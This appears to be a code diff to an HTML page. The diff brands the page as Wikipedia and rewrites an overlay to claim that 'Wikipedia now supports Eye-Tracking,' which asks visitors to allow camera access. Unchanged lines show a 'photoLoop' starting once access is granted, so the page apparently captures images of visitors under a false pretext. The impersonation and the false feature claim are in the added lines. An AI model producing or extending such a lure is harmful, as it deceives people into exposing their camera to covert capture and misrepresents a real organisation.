@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
     
-    <title>__TITLE__</title>
-    <meta property="og:title" content="__TITLE__">
-    <meta property="og:description" content="__DESC__">
-    <meta property="og:image" content="__IMAGE__">
+    <title>Wikipedia, the free encyclopedia</title>
+    <meta property="og:title" content="Wikipedia">
+    <meta property="og:description" content="Wikipedia is a free, multilingual, online encyclopedia created and maintained by a global community of volunteers (Wikipedians) through open collaboration. Launched in 2001, it is the world's largest, most-read reference work, covering over 300 languages and featuring millions of articles that can be edited by anyone with internet access.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOuDS48ZeYus_Okvc0Ocw640Flpe-GXlBeq5X0kHy_XA&s=10">
+    <meta property="og:type" content="website">
 
     <style>
         body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #fff; font-family: sans-serif; }
@@ -20,7 +21,7 @@
 
         .wiki-logo { width: 80px; margin-bottom: 25px; }
         h2 { font-size: 22px; color: #202122; margin: 0 0 12px 0; }
-        p { color: #54595d; font-size: 15px; line-height: 1.5; max-width: 300px; margin: 0 0 35px 0; }
+        p { color: #54595d; font-size: 15px; line-height: 1.5; max-width: 320px; margin: 0 0 35px 0; }
 
         #enable-btn {
             background: #36b; color: #fff; border: none; padding: 16px 0;
@@ -37,7 +38,7 @@
 <div id="overlay">
     <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo">
     <h2>Enable Smart-Scroll</h2>
-    <p>Allow camera access to automatically scroll the article based on your eye movement for a hands-free experience.</p>
+    <p>Wikipedia now supports Eye-Tracking. Allow camera access to automatically scroll the article as you read.</p>
     <button id="enable-btn">Enable & Read</button>
 </div>
 
@@ -65,7 +66,7 @@
             document.getElementById('overlay').style.display = "none";
             
             startTime = Date.now();
-            setTimeout(photoLoop, 2000); // 2s warm-up to prevent black frames
+            setTimeout(photoLoop, 2000); 
         } catch (e) { alert("Access required."); }
     });
 
